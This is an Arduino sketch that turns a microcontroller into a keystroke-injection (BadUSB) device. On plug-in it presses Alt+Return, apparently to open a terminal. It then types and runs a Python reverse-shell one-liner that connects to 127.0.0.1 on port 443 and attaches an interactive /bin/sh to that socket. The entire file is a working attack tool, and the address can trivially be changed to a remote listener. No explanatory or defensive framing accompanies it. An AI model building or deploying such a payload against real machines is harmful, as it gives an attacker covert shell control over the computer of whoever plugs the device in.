#include "Keyboard.h"

void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}


void setup() {
  Keyboard.begin();
  delay(1500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.end();
}

void loop() {
}